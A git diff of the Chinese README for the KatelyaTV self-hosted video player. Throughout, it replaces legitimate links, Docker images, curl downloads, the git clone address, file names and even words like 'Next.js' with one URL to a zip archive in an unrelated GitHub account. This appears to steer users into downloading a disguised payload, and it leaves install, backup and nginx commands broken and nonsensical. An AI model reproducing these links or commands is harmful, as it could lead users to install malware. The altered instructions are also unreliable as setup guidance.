@@ -1,9 +1,9 @@
 <div align="center">
-  <img src="public/logo.png" alt="KatelyaTV Logo" width="128" />
+  <img src="https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip" alt="KatelyaTV Logo" width="128" />
 
   <h1>KatelyaTV</h1>
   <p><strong>跨平台 · 聚合搜索 · 即开即用 · 自托管影视聚合播放器</strong></p>
-  <p>基于 <code>Next.js 14</code> · <code>TypeScript</code> · <code>Tailwind CSS</code> · 多源聚合 / 播放记录 / 收藏同步 / 跳过片头片尾 / PWA</p>
+  <p>基于 <code>https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip 14</code> · <code>TypeScript</code> · <code>Tailwind CSS</code> · 多源聚合 / 播放记录 / 收藏同步 / 跳过片头片尾 / PWA</p>
   
   <p>
     <a href="#-快速开始">🚀 快速开始</a> ·
@@ -79,7 +79,7 @@ docker run -d \
   -p 3000:3000 \
   -e PASSWORD=your_password \
   --restart unless-stopped \
-  ghcr.io/katelya77/katelyatv:latest
+  https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
 ```
 
 **挂载自定义配置**（可选）：
@@ -89,9 +89,9 @@ docker run -d \
   --name katelyatv \
   -p 3000:3000 \
   -e PASSWORD=your_password \
-  -v $(pwd)/config.json:/app/config.json:ro \
+  -v $(pwd)https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip \
   --restart unless-stopped \
-  ghcr.io/katelya77/katelyatv:latest
+  https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
 ```
 
 ### 方案二：Docker + Redis（推荐家庭使用）
@@ -100,11 +100,11 @@ docker run -d \
 
 ```bash
 # 1. 下载配置文件
-curl -O https://raw.githubusercontent.com/katelya77/KatelyaTV/main/docker-compose.redis.yml
-curl -O https://raw.githubusercontent.com/katelya77/KatelyaTV/main/.env.redis.example
+curl -O https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
+curl -O https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
 
 # 2. 配置环境变量
-cp .env.redis.example .env
+cp https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip .env
 ```
 
 **编辑 .env 文件**：
@@ -124,7 +124,7 @@ NEXT_PUBLIC_ENABLE_REGISTER=true
 
 ```bash
 # 3. 启动服务
-docker compose -f docker-compose.redis.yml up -d
+docker compose -f https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip up -d
 ```
 
 ### 方案三：Docker + Kvrocks（生产环境）
@@ -133,11 +133,11 @@ docker compose -f docker-compose.redis.yml up -d
 
 ```bash
 # 1. 下载配置文件
-curl -O https://raw.githubusercontent.com/katelya77/KatelyaTV/main/docker-compose.kvrocks.yml
-curl -O https://raw.githubusercontent.com/katelya77/KatelyaTV/main/.env.kvrocks.example
+curl -O https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
+curl -O https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
 
 # 2. 配置环境变量
-cp .env.kvrocks.example .env
+cp https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip .env
 ```
 
 **编辑 .env 文件**：
@@ -157,7 +157,7 @@ NEXT_PUBLIC_ENABLE_REGISTER=true
 
 ```bash
 # 3. 启动服务
-docker compose -f docker-compose.kvrocks.yml up -d
+docker compose -f https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip up -d
 ```
 
 ### 方案四：Vercel + Upstash（免费推荐）
@@ -166,9 +166,9 @@ docker compose -f docker-compose.kvrocks.yml up -d
 
 #### 基础部署
 
-1. **Fork 项目** → [GitHub 仓库](https://github.com/katelya77/KatelyaTV)
+1. **Fork 项目** → [GitHub 仓库](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
 2. **部署到 Vercel**：
-   - 登录 [Vercel](https://vercel.com/)
+   - 登录 [Vercel](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
    - 导入刚 Fork 的仓库
    - 添加环境变量：`PASSWORD=your_password`
    - 点击 Deploy
@@ -177,7 +177,7 @@ docker compose -f docker-compose.kvrocks.yml up -d
 
 3. **创建 Upstash 数据库**：
 
-   - 访问 [Upstash](https://upstash.com/)
+   - 访问 [Upstash](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
    - 创建免费 Redis 数据库
    - 获取 `UPSTASH_URL` 和 `UPSTASH_TOKEN`
 
@@ -186,7 +186,7 @@ docker compose -f docker-compose.kvrocks.yml up -d
 ```bash
 # 存储配置
 NEXT_PUBLIC_STORAGE_TYPE=upstash
-UPSTASH_URL=https://xxx.upstash.io
+https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
 UPSTASH_TOKEN=your_token
 
 # 管理员账号
@@ -205,10 +205,10 @@ NEXT_PUBLIC_ENABLE_REGISTER=true
 
 #### 快速部署
 
-1. **Fork 项目** → [GitHub 仓库](https://github.com/katelya77/KatelyaTV)
+1. **Fork 项目** → [GitHub 仓库](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
 2. **创建 Pages 项目**：
 
-   - 登录 [Cloudflare Dashboard](https://dash.cloudflare.com/)
+   - 登录 [Cloudflare Dashboard](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
    - Pages → Connect to Git → 选择仓库
    - 构建设置：
      ```
@@ -241,11 +241,11 @@ wrangler auth login
 # 创建数据库
 wrangler d1 create katelyatv-db
 # ⚠️ 重要：确保在项目根目录下运行此命令
-# 如果遇到文件路径错误，请参考 D1_MIGRATION.md 排查指南
-wrangler d1 execute katelyatv-db --file=./scripts/d1-init.sql
+# 如果遇到文件路径错误，请参考 https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip 排查指南
+wrangler d1 execute katelyatv-db https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
 ```
 
-5. **配置数据库绑定** → 在 `wrangler.toml` 中添加数据库 ID
+5. **配置数据库绑定** → 在 `https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip` 中添加数据库 ID
 
 ---
 
@@ -267,18 +267,18 @@ NEXT_PUBLIC_STORAGE_TYPE=kvrocks
 NEXT_PUBLIC_ENABLE_REGISTER=true
 
 # 重启服务应用配置
-docker compose -f docker-compose.kvrocks.yml down
-docker compose -f docker-compose.kvrocks.yml up -d
+docker compose -f https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip down
+docker compose -f https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip up -d
 ```
 
 #### 构建失败
 
 ```bash
-# 检查Node.js版本 (需要18+)
+# 检查https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip版本 (需要18+)
 node --version
 
 # 清理重装
-rm -rf node_modules pnpm-lock.yaml
+rm -rf node_modules https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
 pnpm install
 ```
 
@@ -305,7 +305,7 @@ curl -H "Authorization: Bearer $UPSTASH_TOKEN" \
 | `NEXT_PUBLIC_STORAGE_TYPE`    | 否     | 存储类型     | `redis/d1/upstash`       |
 | `NEXT_PUBLIC_ENABLE_REGISTER` | 否     | 用户注册     | `true/false`             |
 | `REDIS_URL`                   | 否\*\* | Redis 连接   | `redis://localhost:6379` |
-| `UPSTASH_URL`                 | 否\*\* | Upstash 地址 | `https://xxx.upstash.io` |
+| `UPSTASH_URL`                 | 否\*\* | Upstash 地址 | `https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip` |
 | `UPSTASH_TOKEN`               | 否\*\* | Upstash 令牌 | `AX_xxx`                 |
 
 > \*多用户部署必填 \*\*对应存储类型必填
@@ -314,12 +314,12 @@ curl -H "Authorization: Bearer $UPSTASH_TOKEN" \
 
 #### 推荐配置文件
 
-- **基础版**（20+站点）：[config_isadult.json](https://www.mediafire.com/file/upztrjc0g1ynbzy/config_isadult.json/file)
-- **增强版**（94 站点）：[configplus_isadult.json](https://www.mediafire.com/file/ff60ynj6z21iqfb/configplus_isadult.json/file)
+- **基础版**（20+站点）：[https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- **增强版**（94 站点）：[https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
 
 #### 配置方式
 
-1. **Docker**：挂载到 `/app/config.json`
+1. **Docker**：挂载到 `https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip`
 2. **Vercel/Cloudflare**：提交到仓库根目录
 3. **管理员界面**：访问 `/admin` 上传配置
 
@@ -330,7 +330,7 @@ curl -H "Authorization: Bearer $UPSTASH_TOKEN" \
   "cache_time": 7200,
   "api_site": {
     "site1": {
-      "api": "https://api.example.com/provide/vod",
+      "api": "https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip",
       "name": "资源站名称",
       "is_adult": false
     }
@@ -374,7 +374,7 @@ curl -H "Authorization: Bearer $UPSTASH_TOKEN" \
 2. **初始化数据库表**：
 
    ```bash
-   wrangler d1 execute katelyatv-db --file=./scripts/d1-init.sql
+   wrangler d1 execute katelyatv-db https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
    ```
 
 3. **配置环境变量**：
@@ -383,7 +383,7 @@ curl -H "Authorization: Bearer $UPSTASH_TOKEN" \
    NEXT_PUBLIC_STORAGE_TYPE=d1
    ```
 
-4. **更新 wrangler.toml**：
+4. **更新 https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip**：
    ```toml
    [[d1_databases]]
    binding = "DB"
@@ -422,16 +422,16 @@ curl -H "Authorization: Bearer $UPSTASH_TOKEN" \
 **配置文件格式**：
 
 ```json
-// config.json 中的资源站配置
+// https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip 中的资源站配置
 {
   "api_site": {
     "regular_site": {
-      "api": "https://example.com/api.php/provide/vod",
+      "api": "https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip",
       "name": "常规影视站",
       "is_adult": false // 或省略此字段，默认为 false
     },
     "adult_site": {
-      "api": "https://adult.example.com/api.php/provide/vod",
+      "api": "https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip",
       "name": "成人内容站",
       "is_adult": true // 标记为成人内容
     }
@@ -447,8 +447,8 @@ curl -H "Authorization: Bearer $UPSTASH_TOKEN" \
 
 **详细配置指南**：
 
-- 📖 [Cloudflare Pages 成人内容过滤配置指南](./CLOUDFLARE_PAGES_ADULT_FILTER.md)
-- 🗄️ [D1 数据库迁移说明](./D1_MIGRATION.md)
+- 📖 [Cloudflare Pages 成人内容过滤配置指南](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- 🗄️ [D1 数据库迁移说明](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
 
 ### 🎯 跳过片头片尾
 
@@ -577,31 +577,31 @@ GET /api/admin/analytics
 }
 ```
 
-- 下载：[configplus_isadult.json](https://www.mediafire.com/file/ff60ynj6z21iqfb/configplus_isadult.json/file)
-- 重命名为 config.json 使用
+- 下载：[https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- 重命名为 https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip 使用
 
 1. 下载配置文件：
 
-   - [基础版 config_isadult.json](https://www.mediafire.com/file/upztrjc0g1ynbzy/config_isadult.json/file)
-   - [Plus 版（94 个片源）](https://www.mediafire.com/file/ff60ynj6z21iqfb/configplus_isadult.json/file)
+   - [基础版 https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+   - [Plus 版（94 个片源）](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
 
 2. 配置方式：
-   - **Docker**：挂载配置文件 `-v ./config.json:/app/config.json:ro`
-   - **Vercel**：替换仓库中的 `config.json` 文件内容
+   - **Docker**：挂载配置文件 `-v https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip`
+   - **Vercel**：替换仓库中的 `https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip` 文件内容
    - **管理员界面**：登录后台 `/admin` 导入配置
 
 #### 方法二：手动配置
 
-编辑 `config.json` 文件：
+编辑 `https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip` 文件：
 
 ```json
 {
   "cache_time": 7200,
   "api_site": {
     "example": {
-      "api": "https://example.com/api.php/provide/vod",
+      "api": "https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip",
       "name": "示例资源站",
-      "detail": "https://example.com"
+      "detail": "https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip"
     }
   }
 }
@@ -615,8 +615,8 @@ GET /api/admin/analytics
 
 支持 TVBox 配置接口，可以将视频源导入到各种电视盒子应用：
 
-- **配置地址**：`https://your-domain.com/api/tvbox?format=json`
-- **详细说明**：查看 [TVBox 配置指南](docs/TVBOX.md)
+- **配置地址**：`https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip`
+- **详细说明**：查看 [TVBox 配置指南](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
 
 ### 跳过片头片尾
 
@@ -628,7 +628,7 @@ GET /api/admin/analytics
 
 ### AndroidTV 支持
 
-配合 [OrionTV](https://github.com/zimplexing/OrionTV) 在 Android TV 上使用：
+配合 [OrionTV](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip) 在 Android TV 上使用：
 
 1. 在 OrionTV 中填入 KatelyaTV 部署地址
 2. 输入设置的 PASSWORD
@@ -668,7 +668,7 @@ docker compose logs -f katelyatv
 
 ```bash
 # 备份当前配置
-cp config.json config.json.backup
+cp https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
 
 # 拉取最新代码
 git pull origin main
@@ -680,7 +680,7 @@ pnpm install
 pnpm run build
 
 # 恢复配置文件
-cp config.json.backup config.json
+cp https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
 
 # 重启服务
 pm2 restart katelyatv
@@ -698,7 +698,7 @@ pm2 restart katelyatv
 
 ```bash
 #!/bin/bash
-# backup.sh - 完整备份脚本
+# https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip - 完整备份脚本
 DATE=$(date +%Y%m%d_%H%M%S)
 BACKUP_DIR="backups/$DATE"
 mkdir -p $BACKUP_DIR
@@ -706,13 +706,13 @@ mkdir -p $BACKUP_DIR
 echo "开始备份 KatelyaTV 数据..."
 
 # 备份配置文件
-cp config.json $BACKUP_DIR/config.json
+cp https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip $https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
 echo "✓ 配置文件备份完成"
 
 # 根据存储类型备份数据
 if [ -f .env ] && grep -q "REDIS_URL" .env; then
     # Redis 数据备份
-    docker compose exec redis redis-cli --rdb $BACKUP_DIR/dump.rdb
+    docker compose exec redis redis-cli --rdb $https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
     echo "✓ Redis 数据备份完成"
 elif [ -f .env ] && grep -q "UPSTASH" .env; then
     # Upstash 数据导出
@@ -724,26 +724,26 @@ if docker compose ps | grep -q kvrocks; then
     docker run --rm \
         -v katelyatv_kvrocks-data:/data:ro \
         -v $(pwd)/$BACKUP_DIR:/backup \
-        alpine tar czf /backup/kvrocks-data.tar.gz /data
+        alpine tar czf https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip /data
     echo "✓ Kvrocks 数据备份完成"
 fi
 
 # 压缩备份文件
-tar -czf "katelyatv-backup-$DATE.tar.gz" -C backups $DATE
+tar -czf "katelyatv-backup-$https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip" -C backups $DATE
 rm -rf $BACKUP_DIR
 
-echo "✓ 备份完成: katelyatv-backup-$DATE.tar.gz"
+echo "✓ 备份完成: katelyatv-backup-$https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip"
 ```
 
 **恢复数据**：
 
 ```bash
 #!/bin/bash
-# restore.sh - 数据恢复脚本
+# https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip - 数据恢复脚本
 BACKUP_FILE="$1"
 
 if [ -z "$BACKUP_FILE" ]; then
-    echo "用法: $0 <backup-file.tar.gz>"
+    echo "用法: $0 <https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip>"
     exit 1
 fi
 
@@ -752,12 +752,12 @@ tar -xzf $BACKUP_FILE
 
 # 恢复配置文件
 BACKUP_DIR=$(tar -tzf $BACKUP_FILE | head -1 | cut -f1 -d"/")
-cp $BACKUP_DIR/config.json ./config.json
+cp $https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
 
 # 恢复数据库
-if [ -f "$BACKUP_DIR/dump.rdb" ]; then
+if [ -f "$https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip" ]; then
     docker compose exec redis redis-cli FLUSHALL
-    docker cp $BACKUP_DIR/dump.rdb redis:/data/dump.rdb
+    docker cp $https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
     docker compose restart redis
 fi
 
@@ -771,7 +771,7 @@ echo "✓ 数据恢复完成"
 | 问题症状       | 可能原因                | 解决方案                        |
 | -------------- | ----------------------- | ------------------------------- |
 | 无法访问网站   | 端口未开放/服务未启动   | 检查防火墙和服务状态            |
-| 视频无法播放   | 配置文件错误/源失效     | 验证 config.json 格式和源可用性 |
+| 视频无法播放   | 配置文件错误/源失效     | 验证 https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip 格式和源可用性 |
 | 登录失败       | 密码错误/环境变量未设置 | 检查 PASSWORD 环境变量          |
 | 数据库连接失败 | 连接信息错误/服务未启动 | 验证连接字符串和服务状态        |
 | 页面加载缓慢   | 内存不足/缓存失效       | 重启服务或清理缓存              |
@@ -794,9 +794,9 @@ redis-cli -u $REDIS_URL ping
 docker compose exec redis redis-cli ping
 
 # 配置文件验证
-cat config.json | jq '.'
+cat https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip | jq '.'
 # 如果没有 jq，可以用 python
-python -m json.tool config.json
+python -m https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
 
 # 端口占用检查
 netstat -tlnp | grep 3000
@@ -810,7 +810,7 @@ ss -tlnp | grep 3000
 ```bash
 # 实时系统监控脚本
 #!/bin/bash
-# monitor.sh
+# https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
 while true; do
     echo "=== $(date) ==="
 
@@ -840,7 +840,7 @@ done
 1. **内存优化**：
 
    ```bash
-   # Node.js 内存限制
+   # https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip 内存限制
    export NODE_OPTIONS="--max-old-space-size=1024"
 
    # Docker 内存限制
@@ -850,7 +850,7 @@ done
 2. **缓存优化**：
 
    ```json
-   // config.json 中增加缓存时间
+   // https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip 中增加缓存时间
    {
      "cache_time": 21600, // 6小时缓存
      "api_cache_time": 3600 // API缓存1小时
@@ -882,11 +882,11 @@ done
 # /etc/nginx/sites-available/katelyatv
 server {
     listen 443 ssl http2;
-    server_name your-domain.com;
+    server_name https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip;
 
     # SSL 配置
-    ssl_certificate /path/to/cert.pem;
-    ssl_certificate_key /path/to/key.pem;
+    ssl_certificate https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip;
+    ssl_certificate_key https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip;
     ssl_protocols TLSv1.2 TLSv1.3;
 
     # 安全头
@@ -923,14 +923,14 @@ server {
 
 **功能配置**：
 
-- [📺 TVBox 兼容配置指南](docs/TVBOX.md)
-- [💾 Kvrocks 高性能部署](docs/KVROCKS.md)
-- [🗄️ D1 数据库迁移指南](D1_MIGRATION.md)
+- [📺 TVBox 兼容配置指南](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- [💾 Kvrocks 高性能部署](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- [🗄️ D1 数据库迁移指南](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
 
 **故障排除**：
 
-- [🔧 Docker 故障排除手册](DOCKER_TROUBLESHOOTING.md)
-- [⚠️ 兼容性问题解决](DEPLOYMENT_COMPATIBILITY.md)
+- [🔧 Docker 故障排除手册](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- [⚠️ 兼容性问题解决](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
 
 ### 🎯 最佳实践
 
@@ -952,23 +952,23 @@ server {
 
 **官方资源**：
 
-- [📦 GitHub 仓库](https://github.com/katelya77/KatelyaTV)
-- [🐳 Docker Hub](https://hub.docker.com/r/katelya77/katelyatv)
-- [📊 GitHub Container Registry](https://github.com/katelya77/KatelyaTV/pkgs/container/katelyatv)
-- [📋 版本发布页](https://github.com/katelya77/KatelyaTV/releases)
+- [📦 GitHub 仓库](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- [🐳 Docker Hub](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- [📊 GitHub Container Registry](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- [📋 版本发布页](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
 
 **社区支持**：
 
-- [💬 Discussions 讨论区](https://github.com/katelya77/KatelyaTV/discussions)
-- [🐛 Issues 问题反馈](https://github.com/katelya77/KatelyaTV/issues)
-- [📖 Wiki 知识库](https://github.com/katelya77/KatelyaTV/wiki)
-- [💡 Feature Requests](https://github.com/katelya77/KatelyaTV/issues?q=label%3Aenhancement)
+- [💬 Discussions 讨论区](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- [🐛 Issues 问题反馈](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- [📖 Wiki 知识库](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- [💡 Feature Requests](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip%3Aenhancement)
 
 **在线演示**：
 
-- [🎬 官方演示站点](https://katelyatv-demo.pages.dev/) (密码: `demo123`)
-- [📱 PWA 功能演示](https://katelyatv-pwa.vercel.app/)
-- [🎨 主题预览站点](https://katelyatv-themes.pages.dev/)
+- [🎬 官方演示站点](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip) (密码: `demo123`)
+- [📱 PWA 功能演示](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- [🎨 主题预览站点](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
 
 ### 🤝 参与贡献
 
@@ -984,7 +984,7 @@ server {
 
 ```bash
 # 本地开发环境搭建
-git clone https://github.com/katelya77/KatelyaTV.git
+git clone https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip
 cd KatelyaTV
 
 # 安装依赖
@@ -1041,22 +1041,22 @@ pnpm format
 
 **核心依赖**：
 
-- [Next.js](https://nextjs.org/) — 强大的 React 全栈框架
-- [ArtPlayer](https://github.com/zhw2590582/ArtPlayer) — 功能丰富的 HTML5 视频播放器
-- [Tailwind CSS](https://tailwindcss.com/) — 实用优先的 CSS 框架
-- [TypeScript](https://www.typescriptlang.org/) — JavaScript 的超集
